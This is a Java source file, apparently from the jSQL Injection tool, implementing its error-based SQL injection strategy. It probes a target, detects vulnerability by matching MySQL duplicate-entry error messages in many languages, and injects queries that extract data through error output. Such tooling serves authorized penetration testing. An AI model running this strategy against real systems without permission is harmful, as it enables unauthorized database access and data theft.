package com.jsql.model.injection.strategy;

import java.util.HashMap;
import java.util.Map;

import org.apache.log4j.Logger;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.StoppableException;
import com.jsql.model.suspendable.AbstractSuspendable;
import com.jsql.util.ConnectionUtil;

/**
 * Injection strategy using error attack.
 */
public class ErrorbasedStrategy extends AbstractStrategy {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(ErrorbasedStrategy.class);

    @Override
    public void checkApplicability() {
        LOGGER.trace("Error based test...");
        
        String performanceSourcePage = MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().charInsertion + 
            MediatorModel.model().vendor.getValue().getSqlErrorBasedCheck()
        );

        isApplicable = performanceSourcePage.matches(
            "(?s).*(Duplicate entry '1' for key "
            + "|Like verdier '1' for "
            + "|Like verdiar '1' for "
            + "|Kattuv väärtus '1' võtmele "
            + "|Opakovaný kµúè '1' \\(èíslo kµúèa "
            + "|pienie '1' dla klucza "
            + "|Duplikalt bejegyzes '1' a "
            + "|Ens værdier '1' for indeks "
            + "|Dubbel nyckel '1' för nyckel "
            + "|klíè '1' \\(èíslo klíèe "
            + "|Duplicata du champ '1' pour la clef "
            + "|Entrada duplicada '1' para la clave "
            + "|Cimpul '1' e duplicat pentru cheia "
            + "|Dubbele ingang '1' voor zoeksleutel "
            + "|Valore duplicato '1' per la chiave "
            /*jp missing*/
            /*kr grk ukr rss missing*/
            + "|Dupliran unos '1' za klju"        
            + "|Entrada '1' duplicada para a chave ).*"
        );
        
        if (this.isApplicable) {
            LOGGER.debug("Vulnerable to Error based injection");
            this.allow();
        } else {
            this.unallow();
        }
    }

    @Override
    public void allow() {
        Request request = new Request();
        request.setMessage("MarkErrorbasedVulnerable");
        
        Map<String, Object> msgHeader = new HashMap<>();
        msgHeader.put("Url", ConnectionUtil.urlByUser + ConnectionUtil.dataQuery + MediatorModel.model().charInsertion);

        request.setParameters(msgHeader);
        MediatorModel.model().sendToViews(request);
    }

    @Override
    public void unallow() {
        Request request = new Request();
        request.setMessage("MarkErrorbasedInvulnerable");
        MediatorModel.model().sendToViews(request);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, AbstractSuspendable<String> stoppable) throws StoppableException {
        return MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().charInsertion +
            MediatorModel.model().vendor.getValue().getSqlErrorBased(sqlQuery, startPosition)
        );
    }

    @Override
    public void activateStrategy() {
        LOGGER.info("Using strategy ["+ this.getName() +"]");
        MediatorModel.model().setStrategy(Strategy.ERRORBASED);
        
        Request request = new Request();
        request.setMessage("MarkErrorbasedStrategy");
        MediatorModel.model().sendToViews(request);
    }
    
    @Override
    public String getPerformanceLength() {
        /**
         * mysql errorbase renvoit 64 caractères - 'SQLi' = 60
         * on va prendre 60 caractères après le marqueur SQLi
         */
        return "60" ;
    }
    
    @Override
    public String getName() {
        return "Error based";
    }
}
